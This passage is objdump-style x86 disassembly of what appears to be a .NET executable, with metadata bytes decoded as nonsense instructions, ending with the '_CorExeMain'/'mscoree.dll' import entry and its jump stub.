  40cfdf:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfe6:	04 00 01 
  40cfe9:	0a 0e                	or     (%esi),%cl
  40cfeb:	04 00                	add    $0x0,%al
  40cfed:	01 0a                	add    %ecx,(%edx)
  40cfef:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cff4:	0c 06                	or     $0x6,%al
  40cff6:	00 01                	add    %al,(%ecx)
  40cff8:	0a 11                	or     (%ecx),%dl
  40cffa:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40d001:	04 00 01 
  40d004:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40d009:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40d00d:	ad                   	lods   %ds:(%esi),%eax
  40d00e:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d013:	0c 07                	or     $0x7,%al
  40d015:	07                   	pop    %es
  40d016:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d01c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d021:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d027:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d02d:	12 60 1d             	adc    0x1d(%eax),%ah
  40d030:	0e                   	push   %cs
  40d031:	0e                   	push   %cs
  40d032:	08 12                	or     %dl,(%edx)
  40d034:	60                   	pusha
  40d035:	08 05 07 01 12 81    	or     %al,0x81120107
  40d03b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d040:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d047:	05 08 08 06 00       	add    $0x60808,%eax
  40d04c:	02 07                	add    (%edi),%al
  40d04e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d053:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d05a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d060:	00 02                	add    %al,(%edx)
  40d062:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d068:	02 0b                	add    (%ebx),%cl
  40d06a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d06f:	02 06                	add    (%esi),%al
  40d071:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d076:	02 0a                	add    (%edx),%cl
  40d078:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d07d:	03 12                	add    (%edx),%edx
  40d07f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d086:	07 02 12 
  40d089:	60                   	pusha
  40d08a:	02 04 07             	add    (%edi,%eax,1),%al
  40d08d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d093:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d098:	04 1d                	add    $0x1d,%al
  40d09a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d09f:	06                   	push   %es
  40d0a0:	07                   	pop    %es
  40d0a1:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d0a7:	00 01                	add    %al,(%ecx)
  40d0a9:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d0ae:	06                   	push   %es
  40d0af:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d0b5:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0bb:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0c0:	12 61 11             	adc    0x11(%ecx),%ah
  40d0c3:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0c7:	04 12                	add    $0x12,%al
  40d0c9:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0d0:	1d 05 00 
  40d0d3:	00 fc                	add    %bh,%ah
  40d0d5:	d0 00                	rolb   $1,(%eax)
	...
  40d0df:	00 1e                	add    %bl,(%esi)
  40d0e1:	d1 00                	roll   $1,(%eax)
  40d0e3:	00 00                	add    %al,(%eax)
  40d0e5:	20 00                	and    %al,(%eax)
	...
  40d0fb:	00 10                	add    %dl,(%eax)
  40d0fd:	d1 00                	roll   $1,(%eax)
	...
  40d10f:	00 00                	add    %al,(%eax)
  40d111:	00 5f 43             	add    %bl,0x43(%edi)
  40d114:	6f                   	outsl  %ds:(%esi),(%dx)
  40d115:	72 45                	jb     0x40d15c
  40d117:	78 65                	js     0x40d17e
  40d119:	4d                   	dec    %ebp
  40d11a:	61                   	popa
  40d11b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d122:	72 65                	jb     0x40d189
  40d124:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d128:	6c                   	insb   (%dx),%es:(%edi)
  40d129:	00 00                	add    %al,(%eax)
  40d12b:	00 00                	add    %al,(%eax)
  40d12d:	00 ff                	add    %bh,%bh
  40d12f:	25 00 20 40 00       	and    $0x402000,%eax
